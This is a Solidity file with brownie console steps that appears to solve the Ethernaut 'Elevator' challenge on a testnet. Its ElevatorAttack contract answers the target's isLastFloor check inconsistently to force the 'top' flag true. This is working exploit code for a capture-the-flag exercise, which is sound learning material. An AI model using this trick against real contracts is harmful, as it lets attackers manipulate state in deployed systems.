/* 

# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# Deploy Attack Contract with Elevator Contract address

# call attack() function

# check top boolean value

web3.eth.getStorageAt("ElevatorContractAddress",0)

# submit

# (OPTIONAL) call destroy() 

*/


//SPDX-License-Identifier: MIT
pragma solidity 0.8.6;


interface Elevator {
 function floor() external returns (uint) ;
 function goTo(uint _floor) external;

}


contract ElevatorAttack {

    Elevator elev;

constructor(address _address)  {

    elev = Elevator(_address);
    }

function isLastFloor(uint x) public returns (bool) {

    if (elev.floor() == 0) { //if floor is not set, return false to pass first Elevator check

        return false;

        }

        else {  // if floor is set, return true to set top as true. notice floor state variable is set right after  the check
                // which allow us to distinguish between the first and second call to isLastFloor()

        return true;
        }
    }

function attack(uint x) external {
    // start the attack
    elev.goTo(x);
    }

function destroy() external {

    selfdestruct(payable(msg.sender));
    }
}
